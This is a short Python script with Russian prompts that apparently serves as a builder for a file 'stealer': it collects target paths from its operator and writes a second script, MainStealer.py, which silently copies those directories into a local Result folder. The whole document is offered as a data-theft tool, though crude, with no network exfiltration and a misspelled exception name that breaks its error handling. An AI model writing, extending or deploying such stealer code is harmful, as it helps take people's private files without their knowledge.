listTarget = []
counter = 0
print("[*] '\exit' для выхода из цикла")
while True:
    select = input("[%d] Путь: "%(counter))
    if select !='\\exit':
        listTarget.append(select)
        counter += 1
    else:
        break


with open('MainStealer.py', 'w') as stealer:
    stealer.write('''
from os import getcwd, mkdir
from os.path import basename
from shutil import copytree


directory = getcwd()+'/Result/'
try:
    mkdir(directory)
except FileExsistsError:
    pass


listTarget = '''+ str(listTarget) +'''


for target in listTarget:
    under = directory + basename(target)
    try:
        copytree(target, under)
    except:
        pass
''')
print ("[*] Файл 'MainStealer.py' создан")
